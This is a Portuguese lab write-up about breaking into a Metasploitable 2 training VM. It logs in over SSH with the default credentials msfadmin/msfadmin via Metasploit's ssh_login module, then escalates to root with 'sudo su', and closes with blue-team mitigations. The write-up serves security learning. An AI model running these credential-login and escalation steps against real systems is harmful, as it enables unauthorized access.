# Ataque 03 — SSH com Credenciais Fracas + Escalada de Privilégios

![Categoria](https://img.shields.io/badge/categoria-credenciais%20fracas-orange?style=flat-square)
![Ferramenta](https://img.shields.io/badge/ferramenta-Metasploit%20%2B%20SSH-blue?style=flat-square)
![Alvo](https://img.shields.io/badge/alvo-Metasploitable%202-orange?style=flat-square)
![Resultado](https://img.shields.io/badge/resultado-root%20obtido-brightgreen?style=flat-square)

## Objetivo

Entrar no Metasploitable 2 via SSH usando credenciais fracas
e escalar privilégios de utilizador normal para root.

## Contexto

Ao contrário do exploit vsftpd que explorou uma backdoor no código,
este ataque explora um erro humano — o administrador nunca mudou
as credenciais padrão do sistema (msfadmin/msfadmin).

No mundo real, credenciais fracas ou padrão são uma das
vulnerabilidades mais comuns encontradas em auditorias de segurança.

## Reconhecimento

O Nmap já tinha identificado o serviço SSH ativo:
```
22/tcp  open  ssh  OpenSSH 4.7p1 Debian
```

## Fase 1 — Descoberta de Credenciais com Metasploit

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.4
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

Resultado:
```
[+] Success: 'msfadmin:msfadmin'
[*] SSH session 1 opened
```

O módulo confirmou que as credenciais `msfadmin:msfadmin` funcionam.
São as credenciais padrão do sistema — nunca foram alteradas.

## Fase 2 — Acesso via SSH

```bash
ssh -o "HostKeyAlgorithms=+ssh-rsa" -o "PubkeyAcceptedAlgorithms=+ssh-rsa" msfadmin@10.0.2.4
```

> O Metasploitable usa algoritmos SSH antigos (ssh-rsa) que o Kali
> moderno já não aceita por padrão — é necessário forçar a compatibilidade.

```bash
whoami
```
Resultado: `msfadmin`

## Fase 3 — Escalada de Privilégios

Entrar como `msfadmin` dá acesso limitado ao sistema.
Para obter controlo total é necessário escalar para root.

```bash
sudo su
```
Password: `msfadmin`

```bash
whoami
```
Resultado: `root` ✅

## O que Aprendi

A diferença entre os dois ataques é clara:

- **vsftpd exploit** — entras logo como root, controlo total imediato.
  A vulnerabilidade está no código do software.

- **SSH com credenciais fracas** — entras como utilizador normal
  que pouco ou quase nada consegue fazer. A vulnerabilidade está
  num erro humano — usar uma password igual ao nome de utilizador.
  Depois através do `sudo su` escalamos para root e passamos a ter
  controlo total sobre o sistema inteiro.

A escalada de privilégios é o processo de partir de um acesso
limitado e ir subindo até ao nível mais alto — root.
É como entrar numa empresa como visitante e conseguir aceder
ao cofre do diretor.

## Comparação dos Ataques

| | vsftpd Exploit | SSH Credenciais Fracas |
|---|---|---|
| Tipo | Vulnerabilidade de software | Erro humano |
| Acesso inicial | Root direto | Utilizador normal |
| Escalada necessária | Não | Sim (sudo su) |
| Como prevenir | Atualizar software | Password forte + sem sudo |
| Complexidade | Técnica | Simples |

## Mitigação (Perspetiva Blue Team)

- Nunca usar credenciais padrão — mudar sempre no primeiro acesso
- Implementar política de passwords fortes (mínimo 12 caracteres)
- Desativar login SSH por password — usar apenas chaves SSH
- Remover permissões sudo desnecessárias
- Monitorizar tentativas de login SSH com SIEM
- Implementar fail2ban para bloquear IPs após tentativas falhadas
